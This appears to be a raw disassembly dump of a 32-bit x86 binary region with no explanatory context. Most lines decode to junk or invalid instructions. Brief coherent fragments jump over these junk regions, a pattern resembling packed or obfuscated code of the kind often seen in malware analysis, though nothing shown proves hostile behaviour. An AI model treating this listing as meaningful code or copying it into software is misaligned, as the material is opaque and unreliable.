  40ea01:	aas    
  40ea02:	xor    BYTE PTR [ebx],al
  40ea04:	sub    eax,0x4cfe230b
  40ea09:	inc    ebp
  40ea0a:	enter  0xd3d2,0x11
  40ea0e:	cwde   
  40ea0f:	push   ecx
  40ea10:	sbb    cl,BYTE PTR [esi+0x35]
  40ea13:	dec    eax
  40ea14:	cmp    BYTE PTR [edi-0x4f0fb4d4],ah
  40ea1a:	imul   esp,DWORD PTR [ecx+ebp*8-0x49bb2f09],0xffffffcb
  40ea22:	pop    edx
  40ea23:	nop
  40ea24:	sub    al,0x9
  40ea26:	dec    eax
  40ea27:	and    al,0x33
  40ea29:	out    dx,al
  40ea2a:	pop    edi
  40ea2b:	cmp    al,0x26
  40ea2d:	or     al,0x43
  40ea2f:	dec    eax
  40ea30:	loop   0x40e9e4
  40ea32:	add    edi,ecx
  40ea34:	xchg   edi,eax
  40ea35:	mov    edi,0x818c5460
  40ea3a:	add    bh,BYTE PTR [edx-0x6ee13be5]
  40ea40:	cmp    eax,DWORD PTR ss:[edx]
  40ea43:	(bad)  
  40ea44:	add    DWORD PTR [esi-0x14],esi
  40ea47:	push   ecx
  40ea48:	mov    al,0xe4
  40ea4a:	sbb    bh,cl
  40ea4c:	int    0xcc
  40ea4e:	pop    ecx
  40ea4f:	sub    eax,0x6b92dc60
  40ea54:	push   cs
  40ea55:	push   ecx
  40ea56:	lock mov edx,0x2b26ae30
  40ea5c:	shl    ebx,cl
  40ea5e:	test   BYTE PTR [ebx+0x7d],cl
  40ea61:	sub    esi,DWORD PTR [edx+0x2e]
  40ea64:	add    bh,BYTE PTR [ebp+0x15c97395]
  40ea6a:	repz cmp dh,0x63
  40ea6e:	in     eax,0x7d
  40ea70:	dec    ebp
  40ea71:	xchg   ebp,eax
  40ea72:	cwde   
  40ea73:	sub    DWORD PTR [edi+ebx*1+0x5fc23d2f],ebx
  40ea7a:	xor    ah,BYTE PTR [eax-0x27]
  40ea7d:	(bad)  
  40ea7e:	xchg   ecx,eax
  40ea7f:	push   ecx
  40ea80:	mov    dl,0x8c
  40ea82:	fnstcw WORD PTR [ecx+0x28]
  40ea85:	(bad)  
  40ea86:	stc    
  40ea87:	pop    eax
  40ea88:	adc    DWORD PTR [eax],esp
  40ea8a:	adc    DWORD PTR [edi-0x5e6b82f8],edi
  40ea90:	mov    dh,0xa5
  40ea92:	adc    dh,bh
  40ea94:	stos   BYTE PTR es:[edi],al
  40ea95:	and    al,ch
  40ea97:	pop    ecx
  40ea98:	iret   
  40ea99:	fsub   st,st(4)
  40ea9b:	ins    DWORD PTR es:[edi],dx
  40ea9c:	outs   dx,BYTE PTR ds:[esi]
  40ea9d:	clc    
  40ea9e:	loope  0x40ea8e
  40eaa0:	xchg   edi,eax
  40eaa1:	inc    ecx
  40eaa2:	jne    0x40eb4e
  40eaa8:	add    ecx,edx
  40eaaa:	mov    eax,DWORD PTR [ebp+0x8]
  40eaad:	sbb    ecx,0x443c
  40eab3:	mov    ecx,DWORD PTR [ebp-0x10]
  40eab6:	adc    edx,DWORD PTR ds:0x42fce5
  40eabc:	xor    eax,esi
  40eabe:	add    eax,edi
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x49
  40eb8d:	xor    ax,0xf772
  40eb91:	scas   eax,DWORD PTR es:[edi]
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40eb5a
  40eb99:	jo     0x40eb9c
  40eb9b:	add    DWORD PTR [eax],ebx
  40eb9d:	stos   DWORD PTR es:[edi],eax
  40eb9e:	ins    BYTE PTR es:[edi],dx
  40eb9f:	rcr    DWORD PTR ds:0xf17faa17,0x2f
  40eba6:	mov    ds:0x413ec6f4,eax
  40ebab:	fisttp WORD PTR [eax]
  40ebad:	or     DWORD PTR [ecx+0x2091a74c],ebx
  40ebb3:	mov    ch,0x8c
  40ebb5:	cmp    DWORD PTR [ebp+0x3c],0x20
  40ebb9:	xlat   BYTE PTR ds:[ebx]
  40ebba:	loope  0x40ebdb
  40ebbc:	loopne 0x40ebe0
  40ebbe:	or     esi,DWORD PTR [ecx]
  40ebc0:	mov    BYTE PTR [ebp-0x16d77872],al
  40ebc6:	inc    ecx
  40ebc7:	dec    edx
  40ebc8:	je     0x40eb9a
  40ebca:	cmp    al,0xd7
  40ebcc:	xchg   ebx,eax
  40ebcd:	cwde   
  40ebce:	or     ebp,ebx
  40ebd0:	outs   dx,BYTE PTR ds:[esi]
  40ebd1:	add    DWORD PTR [edx],eax
  40ebd3:	jae    0x40ebf7
  40ebd5:	addr16 adc bh,0xa5
  40ebd9:	jl     0x40eb94
  40ebdb:	and    ch,BYTE PTR [ebx-0x6a]
  40ebde:	push   ds
  40ebdf:	fnstenv [edx]
  40ebe1:	in     al,0x4b
  40ebe3:	out    0xa3,eax
  40ebe5:	sbb    BYTE PTR [ebp+0xe1f615e],dl
  40ebeb:	fxch   st(1)
  40ebed:	out    0xf4,al
  40ebef:	rol    BYTE PTR [edx-0x79],1
  40ebf2:	adc    eax,0x4b7fa414
  40ebf7:	jo     0x40ec71
  40ebf9:	rol    DWORD PTR [esi-0x3fc8b731],0xb5
  40ec00:	or     bl,BYTE PTR [edi+0x67aac867]
  40ec06:	sbb    cl,BYTE PTR [edx+eiz*4]
  40ec09:	fsub   st,st(7)
  40ec0b:	mov    edx,fs
  40ec0d:	ret    
  40ec0e:	call   0xfe1b:0x48dc22e2
  40ec15:	rcl    esp,0x4
  40ec18:	xor    BYTE PTR [ecx+0x7d4aa5a0],ch
  40ec1e:	xor    BYTE PTR [edx-0x68265caa],cl
  40ec24:	shl    BYTE PTR [edi],1
  40ec26:	das    
  40ec27:	retf   
  40ec28:	mov    ah,0x8b
  40ec2a:	clc    
  40ec2b:	ror    DWORD PTR [ebx+0x1034cfe8],0x40
  40ec32:	xchg   ecx,eax
  40ec33:	inc    ebx
  40ec34:	push   esp
  40ec35:	jnp    0x40ec8c
  40ec37:	retf   0x48a4
  40ec3a:	push   cs
  40ec3b:	jno    0x40ec58
  40ec3d:	(bad)  
  40ec3e:	daa    
  40ec3f:	fs xchg esi,eax
  40ec41:	mov    esp,eax
  40ec43:	mov    ah,0xe9
  40ec45:	mov    esp,0xe0d16aa5
  40ec4a:	cmp    eax,0x5a57a015
  40ec4f:	into   
  40ec50:	and    DWORD PTR [esi+0x6d955694],0x12
  40ec57:	jae    0x40ec82
  40ec59:	inc    esp
  40ec5a:	into   
  40ec5b:	fldcw  WORD PTR [ebx+0x64]
  40ec5e:	cmp    DWORD PTR [ecx],edi
  40ec60:	pop    ebx
  40ec61:	ret    0xb447
  40ec64:	je     0x40ec13
  40ec66:	inc    dx
  40ec68:	cld    
  40ec69:	in     al,dx
  40ec6a:	jp     0x40ec32
  40ec6c:	outs   dx,DWORD PTR ds:[esi]
  40ec6d:	xor    al,0x6d
  40ec6f:	out    0x86,eax
  40ec71:	das    
  40ec72:	and    edx,DWORD PTR [ebp+0x3936cab5]
  40ec78:	lock mov ecx,0x9f725f4
  40ec7e:	scas   al,BYTE PTR es:[edi]
  40ec7f:	icebp  
  40ec80:	out    dx,al
  40ec81:	xchg   edx,eax
  40ec82:	dec    ebx
  40ec83:	sub    al,0xbc
  40ec85:	pusha  
  40ec86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec87:	fcom   DWORD PTR ds:0x1cf367f8
  40ec8d:	inc    ebx
  40ec8e:	cmp    eax,0xbf6c747d
  40ec93:	pop    ss
  40ec94:	push   es
  40ec95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec96:	xchg   BYTE PTR [ebp-0x24],cl
  40ec99:	pop    esp
  40ec9a:	out    0x62,al
  40ec9c:	in     al,0x30
  40ec9e:	imul   edi,edi,0xd18d97db
  40eca4:	fisttp WORD PTR [ebp+edx*1+0x5a]
  40eca8:	(bad)  
  40eca9:	pop    esi
  40ecaa:	lds    eax,FWORD PTR [edi-0x49]
  40ecad:	test   al,cl
  40ecaf:	sbb    eax,0xc729eb6d
  40ecb4:	mov    esi,0x9a376cb
  40ecb9:	cmp    eax,0xe7d449fb
  40ecbe:	fcmovnu st,st(4)
  40ecc0:	sbb    eax,0x78933dec
  40ecc5:	xor    bh,BYTE PTR [esi+eiz*1-0x31144f9d]
  40eccc:	xor    dl,cl
  40ecce:	sub    eax,0x52ab98eb
  40ecd3:	xchg   BYTE PTR [eax+eax*4],al
  40ecd6:	fsubr  DWORD PTR [ebx+0x21]
  40ecd9:	mov    al,0x30
  40ecdb:	or     BYTE PTR [ebp-0x4c],bh
  40ecde:	adc    esp,esp
  40ece0:	mov    BYTE PTR [esi+0x3b1446f9],dh
  40ece6:	ror    DWORD PTR [ebx-0x48f013bb],0x4d
  40eced:	cld    
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ed79
  40ed00:	sub    al,BYTE PTR [ebx+0x70aeba1c]
  40ed06:	jo     0x40eccb
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ecf2
  40ed0c:	aam    0xed
  40ed0e:	jmp    0xc4b5:0x1c20d2b9
  40ed15:	fadd   QWORD PTR [ecx-0x6f]
  40ed18:	jb     0x40ecf7
  40ed1a:	push   esi
  40ed1b:	out    0x62,eax
  40ed1d:	adc    esi,DWORD PTR [edx-0x18]
  40ed20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed21:	ins    BYTE PTR es:[edi],dx
  40ed22:	xchg   esi,eax
  40ed23:	sub    edx,DWORD PTR [esi]
  40ed25:	aas    
  40ed26:	cld    
  40ed27:	sbb    DWORD PTR [eax],edi
  40ed29:	stos   DWORD PTR es:[edi],eax
  40ed2a:	push   esp
  40ed2b:	sub    edi,ebp
  40ed2d:	sub    BYTE PTR [edi+0x6e9071bc],cl
  40ed33:	js     0x40ecbd
  40ed35:	es xor bl,BYTE PTR ds:[ebx-0x15]
  40ed3a:	dec    esp
  40ed3b:	(bad)
  40ed40:	sub    BYTE PTR [edi+eax*2-0x2aa19ffe],dh
  40ed47:	push   esi
  40ed48:	das    
  40ed49:	fucomp st(1)
  40ed4b:	cmc    
  40ed4c:	pop    ss
  40ed4d:	sub    eax,0x41715d77
  40ed52:	xchg   esi,eax
  40ed53:	call   0x17227b00
  40ed58:	pop    ebp
  40ed59:	push   edi
  40ed5a:	inc    ecx
  40ed5b:	adc    BYTE PTR [edx-0xe0edafe],0xa
  40ed62:	out    0xbb,al
  40ed64:	imul   esi,edi,0xea80d868
  40ed6a:	and    BYTE PTR [edx+eiz*8+0xd18c837],ah
  40ed71:	or     ebp,ebp
  40ed73:	loopne 0x40eda3
  40ed75:	je     0x40ed63
  40ed77:	push   ebp
  40ed78:	mov    ecx,0xed6ef02f
  40ed7d:	jae    0x40eda8
  40ed7f:	adc    DWORD PTR [edx+ebx*4],0xbe0034ad
  40ed86:	push   edi
  40ed87:	int3   
  40ed88:	jae    0x40ed45
  40ed8a:	dec    esp
  40ed8b:	popa   
  40ed8c:	ss jns 0x40edec
  40ed8f:	or     bl,BYTE PTR ds:0xceb5fb5b
  40ed95:	test   dh,dl
  40ed97:	inc    ecx
  40ed98:	sub    eax,esp
  40ed9a:	pop    edi
  40ed9b:	mov    ecx,DWORD PTR [eax-0x2c281b2f]
  40eda1:	repnz mov ch,0x32
  40eda4:	ja     0x40edf8
  40eda6:	sbb    al,0x80
  40eda8:	push   0xffffff95
  40edaa:	stc    
  40edab:	sbb    ah,bh
  40edad:	es jl  0x40ee02
  40edb0:	push   edi
  40edb1:	sbb    DWORD PTR [edx+ebp*8],edi
  40edb4:	sbb    al,0xce
  40edb6:	mov    dl,0x41
  40edb8:	inc    edx
  40edb9:	das    
  40edba:	jecxz  0x40ed8e
  40edbc:	in     eax,0x3a
  40edbe:	pop    ss
  40edbf:	push   cs
  40edc0:	test   edi,ecx
  40edc2:	aam    0x4e
  40edc4:	jne    0x40edba
  40edc6:	popf   
  40edc7:	mov    edi,0x59914d7b
  40edcc:	outs   dx,DWORD PTR ds:[esi]
  40edcd:	aaa    
  40edce:	loope  0x40edd4
  40edd0:	je     0x40ed6a
  40edd2:	shl    BYTE PTR [ecx],0xf3
  40edd5:	js     0x40ed75
  40edd7:	xor    eax,DWORD PTR [edx+0x5ed051a6]
  40eddd:	jecxz  0x40eda2
  40eddf:	inc    eax
  40ede0:	mov    ah,0x59
  40ede2:	jnp    0x40ede2
  40ede4:	or     eax,0x5af66165
  40ede9:	int    0x68
  40edeb:	les    esi,FWORD PTR [ebx-0x7a]
  40edee:	mov    ch,0x5f
  40edf0:	mul    BYTE PTR [ebx]
  40edf2:	and    BYTE PTR [ebx-0x3d7b81d5],cl
  40edf8:	lods   al,BYTE PTR ds:[esi]
  40edf9:	rcl    DWORD PTR [ebp+0x722f1da9],1
  40edff:	push   0xffffffa4
  40ee01:	ins    BYTE PTR es:[edi],dx
  40ee02:	ret    0x6bfd
  40ee05:	cmp    al,0xb3
  40ee07:	std    
  40ee08:	mov    dl,0x12
  40ee0a:	ins    DWORD PTR es:[edi],dx
  40ee0b:	sbb    DWORD PTR [ecx-0x15f58c1],ebp
  40ee11:	adc    eax,0x662b5581
  40ee16:	repz lahf 
  40ee18:	stc    
  40ee19:	lods   eax,DWORD PTR ds:[esi]
  40ee1a:	(bad)  
  40ee1b:	ins    BYTE PTR es:[edi],dx
  40ee1c:	inc    edi
  40ee1d:	(bad)
  40ee21:	sbb    BYTE PTR [ebx+ecx*1],dh
  40ee24:	jns    0x40ee42
  40ee26:	pop    esi
  40ee27:	shr    DWORD PTR [edx-0x10],0x8b
  40ee2b:	imul   esp,DWORD PTR [ebp-0x17b2cee2],0x49f1c793
  40ee35:	fwait
  40ee36:	add    DWORD PTR [ebx+0x3d87a57e],0xeffac7a
  40ee40:	pop    edi
  40ee41:	not    BYTE PTR [ecx-0x41952cbe]
  40ee47:	addr16 jb 0x40ee16
  40ee4a:	jnp    0x40ee43
  40ee4c:	push   edi
  40ee4d:	or     al,0xd1
  40ee4f:	loop   0x40eeae
  40ee51:	mov    ecx,0x739c8363
  40ee56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee57:	inc    esi
  40ee58:	jg     0x40efd7
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0xf9
  40ee7f:	cmp    DWORD PTR [ebp-0x33],edi
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ee21
  40ee8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee8c:	xchg   ebp,eax
  40ee8d:	jmp    0x40ee18
  40ee8f:	xchg   edi,eax
  40ee90:	leave  
  40ee91:	fimul  WORD PTR [ebx]
  40ee93:	jmp    0x7f2f6317
  40ee98:	or     eax,DWORD PTR [ebx]
  40ee9a:	shl    ecx,0x60
  40ee9d:	pop    es
  40ee9e:	in     eax,0xd1
  40eea0:	sbb    DWORD PTR [ebp-0x5e],edi
  40eea3:	gs lock (bad) 
  40eea6:	fiadd  WORD PTR [ebx-0x6]
  40eea9:	sub    BYTE PTR [esp+ebp*8-0x1d],cl
  40eead:	pop    ebp
  40eeae:	dec    edi
  40eeaf:	cmp    eax,0x36821d16
  40eeb4:	in     al,0x53
  40eeb6:	push   cs
  40eeb7:	sub    DWORD PTR ds:0xd56b6a74,ebp
  40eebd:	sub    cl,bh
  40eebf:	(bad)
  40eec3:	mov    ds:0xd10e37ea,eax
  40eec8:	xor    ch,BYTE PTR [ebx-0x298fe03c]
  40eece:	jnp    0x40ef27
  40eed0:	inc    edi
  40eed1:	jle    0x40eedb
  40eed3:	mov    dh,0x13
  40eed5:	fucomp st(4)
  40eed7:	jnp    0x8a97df34
  40eedd:	shr    BYTE PTR [eax+0x1150af44],cl
  40eee3:	test   al,0x14
  40eee5:	fstp   DWORD PTR [ebx]
  40eee7:	inc    esp
  40eee8:	inc    edx
  40eee9:	imul   esp,DWORD PTR [edx],0x1e
  40eeec:	add    ebx,eax
  40eeee:	and    cl,BYTE PTR [esi-0x2b389a2a]
  40eef4:	fcmovnbe st,st(0)
  40eef6:	or     eax,0xdd12dc20
  40eefb:	push   bx
  40eefd:	nop
  40eefe:	test   DWORD PTR [eax-0x68],esi
  40ef01:	pop    es
  40ef02:	scas   al,BYTE PTR es:[edi]
  40ef03:	call   0x6c4c:0x2e087fc3
  40ef0a:	loopne 0x40ef3f
  40ef0c:	in     eax,dx
  40ef0d:	call   0xfdae854a
  40ef12:	out    0x5e,eax
  40ef14:	xchg   esp,eax
  40ef15:	daa    
  40ef16:	test   DWORD PTR [edx+0x3bc2024a],ebx
  40ef1c:	xlat   BYTE PTR ds:[ebx]
  40ef1d:	in     al,dx
  40ef1e:	push   eax
  40ef1f:	pop    edi
  40ef20:	sub    ecx,DWORD PTR [edi-0x5853f042]
  40ef26:	into   
  40ef27:	in     al,dx
  40ef28:	cld    
  40ef29:	loope  0x40ef28
  40ef2b:	ror    BYTE PTR [ebx-0x74],0x8b
  40ef2f:	dec    edi
  40ef30:	sub    eax,0x5889479b
  40ef35:	sbb    bh,BYTE PTR [ebx-0x5d]
  40ef38:	xchg   ebx,eax
  40ef39:	xchg   esp,eax
  40ef3a:	ret    0x3204
  40ef3d:	in     al,0x6f
  40ef3f:	cmp    al,0x5c
  40ef41:	test   eax,0xd6963e6d
  40ef46:	mov    ebx,0x6632898c
  40ef4b:	sar    BYTE PTR [ecx+ebp*1+0x5f],1
  40ef4f:	pop    edi
  40ef50:	fisubr WORD PTR [ebp-0x5a]
  40ef53:	es and eax,0x471107f3
  40ef59:	push   es
  40ef5a:	and    DWORD PTR [edx-0x5b],edi
  40ef5d:	pop    eax
  40ef5e:	sub    ebp,DWORD PTR [ebx+0x32]
  40ef61:	mov    esi,0xcfe787c5
  40ef66:	xchg   ebx,eax
  40ef67:	aad    0xc9
  40ef69:	ss enter 0xff3a,0x20
  40ef6e:	xlat   BYTE PTR ds:[ebx]
  40ef6f:	lods   eax,DWORD PTR ds:[esi]
  40ef70:	(bad)  
  40ef71:	pop    ebx
  40ef72:	imul   edx,DWORD PTR [ecx],0x51e2a4b3
  40ef78:	addr16 inc ecx
  40ef7a:	test   cl,ch
  40ef7c:	add    dh,cl
  40ef7e:	aam    0x90
  40ef80:	enter  0xbec3,0x40
  40ef84:	aam    0xd3
  40ef86:	icebp  
  40ef87:	(bad)  
  40ef89:	fwait
  40ef8a:	icebp  
  40ef8b:	and    bh,0xcd
  40ef8e:	push   ebx
  40ef8f:	adc    DWORD PTR [ebp+eax*2+0x7d],esi
  40ef93:	shr    DWORD PTR [ebx+0x5b],cl
  40ef96:	popa   
  40ef97:	test   al,0x13
  40ef99:	and    DWORD PTR [edx+ebp*2],ebp
  40ef9c:	mov    eax,ds:0xaac99c91
  40efa1:	pop    ebp
  40efa2:	jge    0x40ef68
  40efa4:	jbe    0x40efa8
  40efa6:	mov    dh,0xdb
  40efa8:	test   eax,0x31f9abfb
  40efad:	dec    esp
  40efae:	fisttp WORD PTR [ecx+0x3c0c31e1]
  40efb4:	and    ch,BYTE PTR [edi+0x2a]
  40efb7:	add    eax,0xf2dfd9dd
  40efbc:	fsubr  QWORD PTR [edx-0x63]
  40efbf:	push   esi
  40efc0:	adc    BYTE PTR [edi],bl
  40efc2:	xor    al,0x23
  40efc4:	add    DWORD PTR [eax-0x6a],esp
  40efc7:	fmul   QWORD PTR [edx]
  40efc9:	jp     0x40ef8a
  40efcb:	in     al,dx
  40efcc:	or     cl,bh
  40efce:	xor    al,0x72
  40efd0:	inc    esi
  40efd1:	ret    
  40efd2:	pusha  
  40efd3:	loope  0x40effa
  40efd5:	div    DWORD PTR [edi+0x33]
  40efd8:	(bad)  
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	pop    es
  40effb:	and    DWORD PTR [ebx+eax*1-0x30],edx
  40efff:	stos   DWORD PTR es:[edi],eax
  40f000:	jo     0x40f072
  40f002:	ret    
  40f003:	jg     0x40f075
  40f005:	jo     0x40efce
  40f007:	xor    edi,eax
  40f009:	add    edx,DWORD PTR [ecx+eax*1+0x38]
  40f00d:	sbb    edi,eax
  40f00f:	pop    ebx
  40f010:	lods   al,BYTE PTR ds:[esi]
  40f011:	cmp    ch,BYTE PTR [esi-0x4f]
  40f014:	hlt    
  40f015:	rep lods eax,DWORD PTR ds:[esi]
  40f017:	cmp    al,al
  40f019:	xchg   esp,eax
  40f01a:	dec    ecx
  40f01b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f01c:	mul    edx
  40f01e:	fucom  st(1)
  40f020:	add    eax,0xf6be7662
  40f025:	push   ds
  40f026:	adc    edi,DWORD PTR [ecx+0x37bd670d]
  40f02c:	stos   BYTE PTR es:[edi],al
  40f02d:	pop    edx
  40f02e:	jae    0x40effd
  40f030:	ret    
  40f031:	aaa    
  40f032:	gs and ch,bh
  40f035:	ret    0xa65f
  40f038:	sub    ecx,DWORD PTR [edx]
  40f03a:	sub    eax,0x7db7824b
  40f03f:	sahf   
  40f040:	aaa    
  40f041:	pop    ebx
  40f042:	lds    eax,FWORD PTR [eax+0x263da80a]
  40f048:	lods   eax,DWORD PTR ds:[esi]
  40f049:	xor    BYTE PTR [ebx+0x11],al
  40f04c:	sahf   
  40f04d:	call   0xb23a:0xb3d8b0e5
  40f054:	xchg   edx,eax
  40f055:	pop    ecx
  40f056:	pop    ebx
  40f057:	fidiv  DWORD PTR [eax-0x1b196a47]
  40f05d:	sbb    esp,DWORD PTR [edi-0x6c86018a]
  40f063:	mov    DWORD PTR [edx+0x498aaa6c],edi
  40f069:	jns    0x40f0d6
  40f06b:	mov    ch,0x1f
  40f06d:	pop    ebp
  40f06e:	jmp    0xf780:0x942505e2
  40f075:	xor    edi,ecx
  40f077:	mov    eax,ds:0xed541346
  40f07c:	cmc    
  40f07d:	lods   eax,DWORD PTR ds:[esi]
  40f07e:	sbb    eax,0x7d4a7436
  40f083:	js     0x40f0e8
  40f085:	pop    edx
  40f086:	pop    es
  40f087:	adc    DWORD PTR [edi+0x166d79f2],ebp
  40f08d:	jmp    0x40f040
  40f08f:	mov    cl,0xde
  40f091:	(bad)  
  40f092:	sbb    al,0x67
  40f094:	dec    esi
  40f095:	sub    al,0xfd
  40f097:	inc    edx
  40f098:	iret   
  40f099:	pop    ecx
  40f09a:	arpl   sp,di
  40f09c:	mov    ds:0xf292d586,eax
  40f0a1:	test   BYTE PTR [ebp+0x44],ah
  40f0a4:	cmp    al,bh
  40f0a6:	in     eax,0xcc
  40f0a8:	icebp  
  40f0a9:	dec    eax
  40f0aa:	cs std 
  40f0ac:	int3   
  40f0ad:	ins    DWORD PTR es:[edi],dx
  40f0ae:	loopne 0x40f081
  40f0b0:	jmp    0x40f114
  40f0b2:	fild   WORD PTR ds:[edx]
  40f0b5:	xchg   ebp,eax
  40f0b6:	in     eax,dx
  40f0b7:	retf   
  40f0b8:	push   ss
  40f0b9:	cmp    al,0x34
  40f0bb:	imul   esi,esi,0xd90a10e5
  40f0c1:	xchg   ecx,eax
  40f0c2:	push   eax
  40f0c3:	dec    esp
  40f0c4:	test   WORD PTR [edx+0x7e],0xa292
  40f0ca:	neg    DWORD PTR [edi]
  40f0cc:	bound  ebx,QWORD PTR [eax]
  40f0ce:	cmp    al,BYTE PTR ds:0x81f3ce6d
  40f0d4:	pop    ecx
  40f0d5:	adc    DWORD PTR [esi-0x392e3f8],esp
  40f0db:	push   ds
  40f0dc:	or     al,0x3a
  40f0de:	inc    esi
  40f0df:	cmp    BYTE PTR ds:0xe5c1e9ea,ah
  40f0e5:	cdq    
  40f0e6:	xor    DWORD PTR [ebx],0x9155abfc
  40f0ec:	cmp    DWORD PTR [ecx],ebp
  40f0ee:	mov    cl,BYTE PTR [edi]
  40f0f0:	cmp    BYTE PTR [eax+0xa],cl
  40f0f3:	pop    eax
  40f0f4:	inc    ebp
  40f0f5:	(bad)  
  40f0f7:	sub    eax,0x497867c1
  40f0fc:	dec    ecx
  40f0fd:	call   0xf7ac4658
  40f102:	dec    esi
  40f103:	cs hlt 
  40f105:	bnd jb 0x40f177
  40f108:	lock jp 0x40f0fe
  40f10b:	pop    es
  40f10c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f10d:	(bad)  
  40f10e:	push   esp
  40f10f:	pop    edi
  40f110:	call   0x71b799df
  40f115:	in     al,dx
  40f116:	cwde   
  40f117:	nop
  40f118:	mov    ds:0x80b4880a,eax
  40f11d:	ins    DWORD PTR es:[edi],dx
  40f11e:	out    0x63,eax
  40f120:	inc    ebp
  40f121:	in     eax,0x6c
  40f123:	call   0x1856:0x810c9b00
  40f12a:	mov    ds:0x2c352826,al
  40f12f:	mov    ch,0xd1
  40f131:	popf   
  40f132:	sub    DWORD PTR [edx-0x4edecf67],0x40
  40f139:	mov    edi,DWORD PTR [ecx+ebx*4-0x44]
  40f13d:	push   edx
  40f13e:	add    BYTE PTR [esi-0x477944da],0x66
  40f145:	cmp    BYTE PTR [ebp+0x32],bh
  40f148:	ins    DWORD PTR es:[edi],dx
  40f149:	fsubr  QWORD PTR [ecx]
  40f14b:	sub    dh,BYTE PTR [edx-0x7f9119ba]
  40f151:	call   0x1:0x78840f1c
  40f158:	add    BYTE PTR [ebx+0x65e9f845],cl
  40f15e:	add    DWORD PTR [eax],eax
  40f160:	add    BYTE PTR [ebp+0x71cc29c2],ch
  40f166:	rep ins DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [esp+ecx*8],esp
  40f16f:	push   ebp
  40f170:	dec    esp
  40f171:	mov    ds:0xc37070aa,eax
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f1eb
  40f17a:	dec    ecx
  40f17b:	call   0x830f613e
  40f180:	loope  0x40f111
  40f182:	sbb    ch,BYTE PTR ds:0xddb8821c
  40f188:	dec    edi
  40f189:	xor    bl,BYTE PTR [ecx]
  40f18b:	(bad)  
  40f18c:	pop    edi
  40f18d:	adc    BYTE PTR [esi+edi*4-0x12],0xe
  40f192:	push   edi
  40f193:	and    bl,BYTE PTR [edi]
  40f195:	mov    ch,0xd4
  40f197:	cmp    BYTE PTR ds:0x9f767794,0x36
  40f19e:	add    BYTE PTR [eax+eax*4-0x5a],bh
  40f1a2:	outs   dx,DWORD PTR ds:[esi]
  40f1a3:	jns    0x40f1d6
  40f1a5:	cmc    
